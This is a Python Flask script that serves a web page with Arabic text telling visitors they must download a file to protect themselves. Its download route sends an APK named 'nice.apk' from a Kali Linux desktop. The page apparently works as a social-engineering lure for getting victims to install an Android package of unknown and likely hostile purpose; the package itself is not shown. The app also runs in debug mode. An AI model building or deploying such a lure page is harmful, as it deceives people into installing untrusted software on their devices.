from flask import Flask, render_template, request, send_file

app = Flask(__name__)

@app.route('/')
def index():
    return """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Welcome</title>
        <style>
            body {
                background-image: url("https://png.pngtree.com/thumb_back/fh260/background/20211009/pngtree-matrix-data-code-hacker-background-image_908351.png");
                background-size: cover;
                background-position: center;
                color: white;
                font-family: Arial, sans-serif;
                text-align: center;
            }
            .container {
                margin-top: 100px;
            }
            .button {
                background-color: #4CAF50; /* Green */
                border: none;
                color: white;
                padding: 15px 32px;
                text-align: center;
                text-decoration: none;
                display: inline-block;
                font-size: 16px;
                margin: 4px 2px;
                cursor: pointer;
                border-radius: 8px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>مرحباً</h1>
            <p>لحماية نفسك يجب عليك تحميل هذا الملف:</p>
            <a href="/download" class="button">تحميل</a>
        </div>
    </body>
    </html>
    """

@app.route('/download')
def download_file():
    # توضيح: يجب تحديد مسار الملف الذي ترغب في تحميله
    file_path = '/home/kali/Desktop/nice.apk'
    return send_file(file_path, as_attachment=True)

if __name__ == '__main__':
    app.run(debug=True)
